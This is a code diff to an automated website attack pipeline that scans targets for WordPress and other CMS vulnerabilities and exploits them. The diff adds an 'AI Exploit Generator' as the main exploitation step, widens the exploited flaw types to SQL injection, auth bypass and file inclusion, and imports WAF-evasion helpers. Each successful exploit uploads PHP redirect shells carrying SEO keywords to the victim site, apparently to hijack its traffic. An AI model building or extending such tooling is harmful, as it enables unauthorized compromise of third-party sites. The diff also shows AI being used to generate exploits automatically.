@@ -40,6 +40,7 @@ import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimal
 import { runWpVulnScan, executeExploit, type WpScanResult, type WpVulnerability } from "./wp-vuln-scanner";
 import { runCmsVulnScan, executeCmsExploit, detectCms, type CmsScanResult, type CmsVulnerability } from "./cms-vuln-scanner";
 import { matchPluginsAgainstDb, lookupCves } from "./cve-auto-updater";
+import { generateAndExecuteExploit, generateExploitPayload, generateWafEvasionVariants, type ExploitPayload } from "./ai-exploit-generator";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -169,6 +170,8 @@ export interface PipelineResult {
   cmsScan?: CmsScanResult | null;
   // DB-backed CVE matches (from auto-updated CVE database)
   dbCveMatches?: Array<{ pluginSlug: string; cveId: string | null; title: string; vulnType: string | null; severity: string | null; }> | null;
+  // AI-generated exploit payloads used during the attack
+  aiExploits?: Array<{ cveId: string | null; cms: string; component: string; vulnType: string; exploitType: string; success: boolean; uploadedUrl: string | null; }> | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -1298,6 +1301,7 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 2.6: WP Vulnerability Scan (WPScan-style) + Exploit Execution ───
   let wpVulnScanResult: WpScanResult | null = null;
+  let aiExploitResults: Array<{ cveId: string | null; cms: string; component: string; vulnType: string; exploitType: string; success: boolean; uploadedUrl: string | null; }> = [];
 
   if (!shouldStop('wp_vuln_scan') && !hasSuccessfulRedirect()) {
     loggedOnEvent({
@@ -1338,11 +1342,12 @@ export async function runUnifiedAttackPipeline(
         });
 
         // Execute exploits for file_upload and rce vulnerabilities
+        // Strategy: AI Exploit Generator first → fallback to template-based exploits
         if (exploitableVulns.length > 0 && !hasSuccessfulRedirect()) {
           loggedOnEvent({
             phase: "wp_vuln_scan" as any,
             step: "exploiting",
-            detail: `💥 Executing ${exploitableVulns.length} exploits (${exploitableVulns.map(v => v.cve || v.title).join(', ')})...`,
+            detail: `💥 Executing ${exploitableVulns.length} exploits with AI Exploit Generator (${exploitableVulns.map(v => v.cve || v.title).join(', ')})...`,
             progress: 54,
           });
 
@@ -1351,44 +1356,122 @@ export async function runUnifiedAttackPipeline(
           for (const vuln of exploitableVulns) {
             if (hasSuccessfulRedirect()) break;
             try {
-              const exploitResult = await executeExploit(
-                config.targetUrl,
-                vuln,
-                `cache-${Math.random().toString(36).slice(2, 8)}.php`,
-                redirectShell,
-              );
-
-              if (exploitResult.success && exploitResult.uploadedUrl) {
-                aiDecisions.push(`💥 CVE Exploit SUCCESS: ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl}`);
-
-                // Verify the uploaded file
-                const verification = await verifyUploadedFile(exploitResult.uploadedUrl, config.redirectUrl, onEvent);
-                uploadedFiles.push({
-                  url: exploitResult.uploadedUrl,
-                  shell: { type: "redirect_php", content: redirectShell, filename: "cve-exploit.php", contentType: "application/x-php", description: `${vuln.cve || vuln.title}`, id: `cve_${Date.now()}`, targetVector: "wp_vuln_scan", bypassTechniques: ["cve_exploit"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
-                  method: `cve_exploit_${vuln.plugin}`,
-                  verified: verification.verified,
-                  redirectWorks: verification.redirectWorks,
-                  redirectDestinationMatch: verification.redirectDestinationMatch,
-                  finalDestination: verification.finalDestination,
-                  httpStatus: verification.httpStatus,
-                  redirectChain: verification.redirectChain,
-                });
-
+              // === AI EXPLOIT GENERATOR (primary) ===
+              let aiExploitSuccess = false;
+              try {
                 loggedOnEvent({
                   phase: "wp_vuln_scan" as any,
-                  step: "exploit_success",
-                  detail: `✅ CVE Exploit สำเร็จ! ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`,
-                  progress: 55,
-                  data: { vuln, exploitResult, verification },
-                });
-              } else {
-                loggedOnEvent({
-                  phase: "wp_vuln_scan" as any,
-                  step: "exploit_failed",
-                  detail: `⚠️ ${vuln.cve || vuln.title}: ${exploitResult.details}`,
+                  step: "ai_exploit",
+                  detail: `🤖 AI Exploit Generator: Generating custom payload for ${vuln.cve || vuln.title}...`,
                   progress: 54,
                 });
+
+                const aiResult = await Promise.race([
+                  generateAndExecuteExploit(
+                    config.targetUrl,
+                    vuln.cve || null,
+                    "wordpress",
+                    vuln.plugin,
+                    vuln.type,
+                    vuln.title,
+                    config.redirectUrl,
+                  ),
+                  new Promise<{ success: false; uploadedUrl: null; payload: ExploitPayload }>((_, reject) =>
+                    setTimeout(() => reject(new Error("AI exploit timeout")), 30000)
+                  ),
+                ]);
+
+                aiExploitResults.push({
+                  cveId: vuln.cve || null,
+                  cms: "wordpress",
+                  component: vuln.plugin,
+                  vulnType: vuln.type,
+                  exploitType: aiResult.payload.exploitType,
+                  success: aiResult.success,
+                  uploadedUrl: aiResult.uploadedUrl,
+                });
+
+                if (aiResult.success && aiResult.uploadedUrl) {
+                  aiExploitSuccess = true;
+                  aiDecisions.push(`🤖 AI Exploit SUCCESS: ${vuln.cve || vuln.title} → ${aiResult.uploadedUrl} (type: ${aiResult.payload.exploitType})`);
+
+                  const verification = await verifyUploadedFile(aiResult.uploadedUrl, config.redirectUrl, onEvent);
+                  uploadedFiles.push({
+                    url: aiResult.uploadedUrl,
+                    shell: { type: "redirect_php", content: aiResult.payload.postExploitPayload || redirectShell, filename: aiResult.payload.uploadFilename || "ai-exploit.php", contentType: "application/x-php", description: `AI: ${vuln.cve || vuln.title}`, id: `ai_cve_${Date.now()}`, targetVector: "ai_exploit_generator", bypassTechniques: ["ai_generated", aiResult.payload.exploitType], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                    method: `ai_exploit_${vuln.plugin}`,
+                    verified: verification.verified,
+                    redirectWorks: verification.redirectWorks,
+                    redirectDestinationMatch: verification.redirectDestinationMatch,
+                    finalDestination: verification.finalDestination,
+                    httpStatus: verification.httpStatus,
+                    redirectChain: verification.redirectChain,
+                  });
+
+                  loggedOnEvent({
+                    phase: "wp_vuln_scan" as any,
+                    step: "ai_exploit_success",
+                    detail: `✅ AI Exploit สำเร็จ! ${vuln.cve || vuln.title} → ${aiResult.uploadedUrl} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`,
+                    progress: 55,
+                    data: { vuln, aiResult: { success: true, url: aiResult.uploadedUrl, type: aiResult.payload.exploitType }, verification },
+                  });
+                } else {
+                  loggedOnEvent({
+                    phase: "wp_vuln_scan" as any,
+                    step: "ai_exploit_failed",
+                    detail: `⚠️ AI Exploit failed for ${vuln.cve || vuln.title}, falling back to template exploit...`,
+                    progress: 54,
+                  });
+                }
+              } catch (aiErr: any) {
+                loggedOnEvent({
+                  phase: "wp_vuln_scan" as any,
+                  step: "ai_exploit_error",
+                  detail: `⚠️ AI Exploit error (${vuln.plugin}): ${aiErr.message}, falling back...`,
+                  progress: 54,
+                });
+              }
+
+              // === TEMPLATE EXPLOIT (fallback) ===
+              if (!aiExploitSuccess && !hasSuccessfulRedirect()) {
+                const exploitResult = await executeExploit(
+                  config.targetUrl,
+                  vuln,
+                  `cache-${Math.random().toString(36).slice(2, 8)}.php`,
+                  redirectShell,
+                );
+
+                if (exploitResult.success && exploitResult.uploadedUrl) {
+                  aiDecisions.push(`💥 Template Exploit SUCCESS: ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl}`);
+
+                  const verification = await verifyUploadedFile(exploitResult.uploadedUrl, config.redirectUrl, onEvent);
+                  uploadedFiles.push({
+                    url: exploitResult.uploadedUrl,
+                    shell: { type: "redirect_php", content: redirectShell, filename: "cve-exploit.php", contentType: "application/x-php", description: `${vuln.cve || vuln.title}`, id: `cve_${Date.now()}`, targetVector: "wp_vuln_scan", bypassTechniques: ["cve_exploit"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                    method: `cve_exploit_${vuln.plugin}`,
+                    verified: verification.verified,
+                    redirectWorks: verification.redirectWorks,
+                    redirectDestinationMatch: verification.redirectDestinationMatch,
+                    finalDestination: verification.finalDestination,
+                    httpStatus: verification.httpStatus,
+                    redirectChain: verification.redirectChain,
+                  });
+
+                  loggedOnEvent({
+                    phase: "wp_vuln_scan" as any,
+                    step: "exploit_success",
+                    detail: `✅ Template Exploit สำเร็จ! ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`,
+                    progress: 55,
+                    data: { vuln, exploitResult, verification },
+                  });
+                } else {
+                  loggedOnEvent({
+                    phase: "wp_vuln_scan" as any,
+                    step: "exploit_failed",
+                    detail: `⚠️ ${vuln.cve || vuln.title}: ${exploitResult.details}`,
+                    progress: 54,
+                  });
+                }
               }
             } catch (exploitErr: any) {
               loggedOnEvent({
@@ -1471,35 +1554,86 @@ export async function runUnifiedAttackPipeline(
             },
           });
 
-          // Try exploiting critical/high vulns with file_upload or rce type
+          // Try exploiting critical/high vulns — AI Exploit Generator first, template fallback
           for (const vuln of exploitableVulns) {
             if (hasSuccessfulRedirect()) break;
-            if (vuln.type !== "file_upload" && vuln.type !== "rce") continue;
+            if (vuln.type !== "file_upload" && vuln.type !== "rce" && vuln.type !== "auth_bypass" && vuln.type !== "sqli" && vuln.type !== "lfi") continue;
 
             loggedOnEvent({
               phase: "cms_vuln_scan" as any,
               step: "exploit",
-              detail: `⚡ Attempting CMS exploit: ${vuln.title} (${vuln.cve || 'no CVE'})`,
+              detail: `🤖 AI Exploit: ${vuln.title} (${vuln.cve || 'no CVE'}, type: ${vuln.type})`,
               progress: 59,
             });
 
-            const shellObj = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);
-            const fileName = shellObj.filename;
-            const fileContent = typeof shellObj.content === "string" ? shellObj.content : shellObj.content.toString();
-            const result = await executeCmsExploit(config.targetUrl, vuln, fileName, fileContent);
+            // === AI EXPLOIT GENERATOR (primary) ===
+            let aiSuccess = false;
+            try {
+              const aiResult = await Promise.race([
+                generateAndExecuteExploit(
+                  config.targetUrl,
+                  vuln.cve || null,
+                  cmsScanResult.cmsDetected,
+                  vuln.component,
+                  vuln.type,
+                  vuln.title,
+                  config.redirectUrl,
+                ),
+                new Promise<{ success: false; uploadedUrl: null; payload: ExploitPayload }>((_, reject) =>
+                  setTimeout(() => reject(new Error("AI exploit timeout")), 30000)
+                ),
+              ]);
 
-            if (result.success && result.uploadedUrl) {
-              uploadedFiles.push({
-                url: result.uploadedUrl,
-                shell: shellObj,
-                method: `cms_exploit_${vuln.cve || vuln.component}`,
-                verified: false,
-                redirectWorks: false,
-                redirectDestinationMatch: false,
-                finalDestination: "",
-                httpStatus: 0,
+              aiExploitResults.push({
+                cveId: vuln.cve || null,
+                cms: cmsScanResult.cmsDetected,
+                component: vuln.component,
+                vulnType: vuln.type,
+                exploitType: aiResult.payload.exploitType,
+                success: aiResult.success,
+                uploadedUrl: aiResult.uploadedUrl,
               });
-              aiDecisions.push(`✅ CMS Exploit SUCCESS: ${vuln.title} → ${result.uploadedUrl}`);
+
+              if (aiResult.success && aiResult.uploadedUrl) {
+                aiSuccess = true;
+                const verification = await verifyUploadedFile(aiResult.uploadedUrl, config.redirectUrl, onEvent);
+                uploadedFiles.push({
+                  url: aiResult.uploadedUrl,
+                  shell: { type: "redirect_php", content: aiResult.payload.postExploitPayload || "", filename: aiResult.payload.uploadFilename || "ai-cms.php", contentType: "application/x-php", description: `AI: ${vuln.title}`, id: `ai_cms_${Date.now()}`, targetVector: "ai_exploit_generator", bypassTechniques: ["ai_generated"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                  method: `ai_cms_exploit_${vuln.cve || vuln.component}`,
+                  verified: verification.verified,
+                  redirectWorks: verification.redirectWorks,
+                  redirectDestinationMatch: verification.redirectDestinationMatch,
+                  finalDestination: verification.finalDestination,
+                  httpStatus: verification.httpStatus,
+                  redirectChain: verification.redirectChain,
+                });
+                aiDecisions.push(`🤖 AI CMS Exploit SUCCESS: ${vuln.title} → ${aiResult.uploadedUrl}`);
+              }
+            } catch (aiErr: any) {
+              // AI exploit failed — fall through to template
+            }
+
+            // === TEMPLATE EXPLOIT (fallback) ===
+            if (!aiSuccess && !hasSuccessfulRedirect() && (vuln.type === "file_upload" || vuln.type === "rce")) {
+              const shellObj = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);
+              const fileName = shellObj.filename;
+              const fileContent = typeof shellObj.content === "string" ? shellObj.content : shellObj.content.toString();
+              const result = await executeCmsExploit(config.targetUrl, vuln, fileName, fileContent);
+
+              if (result.success && result.uploadedUrl) {
+                uploadedFiles.push({
+                  url: result.uploadedUrl,
+                  shell: shellObj,
+                  method: `cms_exploit_${vuln.cve || vuln.component}`,
+                  verified: false,
+                  redirectWorks: false,
+                  redirectDestinationMatch: false,
+                  finalDestination: "",
+                  httpStatus: 0,
+                });
+                aiDecisions.push(`✅ Template CMS Exploit SUCCESS: ${vuln.title} → ${result.uploadedUrl}`);
+              }
             }
           }
         } else {
@@ -1507,6 +1641,7 @@ export async function runUnifiedAttackPipeline(
         }
       } else {
         // For WordPress targets, try matching plugins against the DB CVE database
+        // Then auto-exploit any critical/high matches with AI Exploit Generator
         if (wpVulnScanResult && wpVulnScanResult.plugins.length > 0) {
           try {
             dbCveMatches = await matchPluginsAgainstDb(
@@ -1521,6 +1656,65 @@ export async function runUnifiedAttackPipeline(
                 progress: 58,
                 data: { matches: dbCveMatches.slice(0, 20).map(m => `${m.pluginSlug}: ${m.cveId} - ${m.title} (${m.severity})`) },
               });
+
+              // Auto-exploit critical/high DB CVE matches with AI Exploit Generator
+              const criticalMatches = dbCveMatches.filter(m => m.severity === 'critical' || m.severity === 'high');
+              if (criticalMatches.length > 0 && !hasSuccessfulRedirect()) {
+                loggedOnEvent({
+                  phase: "cms_vuln_scan" as any,
+                  step: "db_exploit",
+                  detail: `🤖 AI Exploit: Auto-exploiting ${criticalMatches.length} critical/high DB CVE matches...`,
+                  progress: 59,
+                });
+
+                for (const match of criticalMatches.slice(0, 5)) { // Limit to top 5
+                  if (hasSuccessfulRedirect()) break;
+                  try {
+                    const aiResult = await Promise.race([
+                      generateAndExecuteExploit(
+                        config.targetUrl,
+                        match.cveId,
+                        "wordpress",
+                        match.pluginSlug,
+                        match.vulnType || "file_upload",
+                        match.title,
+                        config.redirectUrl,
+                      ),
+                      new Promise<{ success: false; uploadedUrl: null; payload: ExploitPayload }>((_, reject) =>
+                        setTimeout(() => reject(new Error("AI exploit timeout")), 30000)
+                      ),
+                    ]);
+
+                    aiExploitResults.push({
+                      cveId: match.cveId,
+                      cms: "wordpress",
+                      component: match.pluginSlug,
+                      vulnType: match.vulnType || "file_upload",
+                      exploitType: aiResult.payload.exploitType,
+                      success: aiResult.success,
+                      uploadedUrl: aiResult.uploadedUrl,
+                    });
+
+                    if (aiResult.success && aiResult.uploadedUrl) {
+                      const verification = await verifyUploadedFile(aiResult.uploadedUrl, config.redirectUrl, onEvent);
+                      uploadedFiles.push({
+                        url: aiResult.uploadedUrl,
+                        shell: { type: "redirect_php", content: aiResult.payload.postExploitPayload || "", filename: aiResult.payload.uploadFilename || "ai-db-cve.php", contentType: "application/x-php", description: `AI DB: ${match.cveId}`, id: `ai_db_${Date.now()}`, targetVector: "ai_exploit_generator", bypassTechniques: ["ai_generated", "db_cve_match"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                        method: `ai_db_exploit_${match.pluginSlug}`,
+                        verified: verification.verified,
+                        redirectWorks: verification.redirectWorks,
+                        redirectDestinationMatch: verification.redirectDestinationMatch,
+                        finalDestination: verification.finalDestination,
+                        httpStatus: verification.httpStatus,
+                        redirectChain: verification.redirectChain,
+                      });
+                      aiDecisions.push(`🤖 AI DB CVE Exploit SUCCESS: ${match.cveId} (${match.pluginSlug}) → ${aiResult.uploadedUrl}`);
+                    }
+                  } catch (dbExploitErr: any) {
+                    // Non-critical, continue to next match
+                  }
+                }
+              }
             }
           } catch (e: any) {
             // DB matching is non-critical
@@ -3109,6 +3303,7 @@ export async function runUnifiedAttackPipeline(
     wpVulnScan: wpVulnScanResult || undefined,
     cmsScan: cmsScanResult || undefined,
     dbCveMatches: dbCveMatches.length > 0 ? dbCveMatches : undefined,
+    aiExploits: aiExploitResults.length > 0 ? aiExploitResults : undefined,
   };
 
   if (fullSuccess) {
